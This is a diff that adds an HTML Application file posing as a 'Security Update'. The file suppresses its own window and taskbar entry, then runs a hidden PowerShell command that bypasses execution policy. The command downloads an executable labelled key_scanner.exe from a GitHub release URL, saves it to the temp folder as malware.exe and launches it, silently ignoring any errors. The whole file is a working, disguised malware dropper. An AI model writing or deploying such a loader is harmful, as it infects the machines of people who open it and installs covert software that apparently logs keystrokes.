@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <HTA:APPLICATION
+      ID="maliciousApp"
+      APPLICATIONNAME="Security Update"
+      BORDER="none"
+      SHOWINTASKBAR="no"
+      SINGLEINSTANCE="yes"
+      WINDOWSTATE="minimize">
+    </HTA:APPLICATION>
+  </head>
+
+  <script language="javascript">
+    try {
+      var shell = new ActiveXObject("WScript.Shell");
+      var command = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr -useb https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe -OutFile $env:TEMP\\malware.exe; Start-Process $env:TEMP\\malware.exe"';
+      shell.Run(command, 0, false);
+    } catch (e) {
+      // silently fail or log
+    }
+
+    window.close();
+  </script>
+</html>
